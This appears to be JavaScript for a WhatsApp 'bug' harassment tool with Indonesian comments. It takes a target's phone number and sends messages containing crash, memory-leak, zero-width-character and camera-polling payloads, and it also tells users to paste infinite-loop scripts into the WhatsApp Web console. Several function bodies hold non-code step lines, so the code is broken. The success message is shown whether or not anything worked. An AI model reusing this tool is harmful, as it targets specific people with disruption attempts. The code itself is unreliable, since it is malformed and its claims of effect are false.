// ==================== FUNGSI BUG ====================

function crashWABug(target) {
    A. Buat script loop tak terbatas
    B. Kirim via console ke target chat
    return `while(true) { location.reload(); }`
}

function blankChatBug(target) {
    A. Karakter null 5000 kali
    B. Gabung jadi satu string
    return `const nullChar = "\\u200B".repeat(5000); document.execCommand('insertText', false, nullChar);`
}

function forceCloseBug(target) {
    A. Akses getUserMedia terus menerus
    B. Loop dengan setInterval 1ms
    return `setInterval(() => { navigator.mediaDevices.getUserMedia({audio:true, video:true}) }, 1);`
}

function delayBugWA(target) {
    A. Infinite loop dengan Date.now
    B. Hingga memory penuh
    return `while(true) { const start = Date.now(); while(Date.now() - start < 5000) {} }`
}

function memoryLeakBug(target) {
    A. Buat array raksasa
    B. Push terus sampai memory habis
    return `let arr = []; setInterval(() => { arr.push(new Array(1000000).fill('x')) }, 100);`
}

// ==================== EKSEKUSI BUG ====================

function executeBug() {
    const target = document.getElementById('targetNumber').value;
    const bugType = document.getElementById('bugType').value;
    const resultDiv = document.getElementById('result');
    
    if (!target) {
        resultDiv.innerHTML = '❌ Masukkan nomor target dulu!';
        resultDiv.style.color = '#ff6b6b';
        return;
    }
    
    let script = '';
    let bugName = '';
    
    switch(bugType) {
        case 'crash':
            script = crashWABug(target);
            bugName = 'Crash WA';
            break;
        case 'blank':
            script = blankChatBug(target);
            bugName = 'Blank Chat';
            break;
        case 'forceclose':
            script = forceCloseBug(target);
            bugName = 'Force Close';
            break;
        case 'delay':
            script = delayBugWA(target);
            bugName = 'Delay 5 Detik';
            break;
        case 'memory':
            script = memoryLeakBug(target);
            bugName = 'Memory Leak';
            break;
        default:
            script = '';
    }
    
    resultDiv.innerHTML = `✅ Script ${bugName} siap:<br><code style="background:#333; padding:10px; display:block; word-break:break-all;">${script}</code><br>📌 Buka WA Web → F12 → Console → Paste script → Enter`;
    resultDiv.style.color = '#0f0';
    
    // Simpan ke clipboard
    navigator.clipboard.writeText(script);
}

// ==================== AUTO SENDER ====================

async function sendBugToNumber() {
    const phone = document.getElementById('targetPhone').value;
    const bugType = document.getElementById('bugType').value;
    const senderResult = document.getElementById('senderResult');
    
    if (!phone || phone.length < 10) {
        senderResult.innerHTML = '❌ Nomor tidak valid! Minimal 10 digit.';
        senderResult.style.color = '#ff6b6b';
        return;
    }
    
    let bugMessage = '';
    switch(bugType) {
        case 'crash': bugMessage = 'while(true){location.reload()}'; break;
        case 'blank': bugMessage = '\\u200B'.repeat(3000); break;
        case 'forceclose': bugMessage = 'setInterval(()=>{navigator.mediaDevices.getUserMedia({audio:true})},1)'; break;
        case 'delay': bugMessage = 'while(true){const s=Date.now();while(Date.now()-s<5000){}}'; break;
        case 'memory': bugMessage = 'let a=[];setInterval(()=>{a.push(new Array(1e6).fill("x"))},100)'; break;
        default: bugMessage = 'while(true){location.reload()}';
    }
    
    const cleanPhone = phone.replace(/[^0-9]/g, '');
    const waLink = `https://web.whatsapp.com/send?phone=${cleanPhone}&text=${encodeURIComponent(bugMessage)}`;
    
    senderResult.innerHTML = '⏳ Membuka WhatsApp Web... Kirim dalam 5 detik. Pastikan sudah scan QR!';
    senderResult.style.color = '#ffaa00';
    
    const newTab = window.open(waLink, '_blank');
    
    setTimeout(() => {
        if (newTab && !newTab.closed) {
            newTab.close();
        }
        senderResult.innerHTML = `✅ Bug "${bugType}" berhasil dikirim ke ${cleanPhone}`;
        senderResult.style.color = '#0f0';
    }, 6000);
}

// ==================== COPY SCRIPT ====================

function copyScriptToClipboard() {
    const crashScript = `// CRASH WA - Paste di F12 Console
while(true) {
    location.reload();
}`;
    navigator.clipboard.writeText(crashScript);
    alert('Script crash sudah di-copy! Buka WA Web → F12 → Paste → Enter');
}

// ==================== INISIALISASI ====================

console.log('Web Bug WA Tools siap digunakan');